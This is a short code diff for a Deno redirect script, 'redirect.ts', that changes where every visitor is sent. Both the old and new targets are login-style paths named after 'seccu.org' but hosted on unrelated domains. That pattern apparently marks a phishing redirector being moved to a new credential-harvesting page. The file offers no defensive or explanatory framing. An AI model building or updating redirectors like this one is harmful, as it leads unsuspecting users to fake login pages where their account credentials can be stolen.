@@ -1,6 +1,6 @@
 // redirect.ts
 
-const redirectUrl = "https://decorsas.com/db/seccu.org/login";
+const redirectUrl = "https://samolinerecruitmentagency.com/tk/seccu.org/login/";
 
 Deno.serve(() =>
   new Response(null, {
